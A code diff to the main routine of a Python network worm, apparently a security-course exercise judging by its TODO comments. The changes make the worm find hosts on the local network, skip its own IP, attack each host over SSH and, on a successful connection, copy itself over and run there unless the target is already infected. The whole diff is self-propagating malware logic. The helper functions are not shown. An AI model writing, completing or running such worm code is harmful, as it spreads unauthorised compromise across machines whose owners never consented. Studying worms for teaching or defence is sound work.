@@ -30,11 +30,11 @@ def main(argv):
 		# Otherwise, proceed with malice.
 		if Replicator.isInfectedSystem():
 			sys.exit(0)
-	else:
-		hostSystem = Replicator.getMyIp()
+
+	# hostSystem = Replicator.getMyIP()
 
 	# TODO: Get the IP of the current system
-	currentIp = Replicator.getMyIp()
+	currentIp = Replicator.getMyIP()
 
 	# Get the hosts on the same network
 	networkHosts = Replicator.getHostsOnTheSameNetwork()
@@ -42,8 +42,12 @@ def main(argv):
 	# TODO: Remove the IP of the current system
 	# from the list of discovered systems (we
 	# do not want to target ourselves!).
-	networkHosts.remove(hostSystem)
-	networkHosts.remove(currentIp)
+
+	# if hostSystem in networkHosts:
+	# 	networkHosts.remove(hostSystem)
+
+	if currentIp in networkHosts:
+		networkHosts.remove(currentIp)
 
 	print("Found hosts: ", networkHosts)
 
@@ -51,14 +55,17 @@ def main(argv):
 	for host in networkHosts:
 
 		# Try to attack this host
-		sshInfo =  myReplicator.attackSystem(host)
+		sshInfo, sshClient =  myReplicator.attackSystem(host)
 
 		print(sshInfo)
 
 		# Did the attack succeed?
-		if sshInfo:
+		if sshInfo == Replicator.SUCCESSFUL_CONNECTION:
 
 			print("Trying to spread")
+
+			if not myReplicator.isInfectedSystem():
+				myReplicator.spreadAndExecute()
 
 			# TODO: Check if the system was
 			# already infected. This can be
@@ -87,7 +94,7 @@ def main(argv):
 			# If the system was already infected proceed.
 			# Otherwise, infect the system and terminate.
 			# Infect that system
-			myReplicator.spreadAndExecute()
+			# myReplicator.spreadAndExecute()
 
 			print ("Spreading complete")
 	
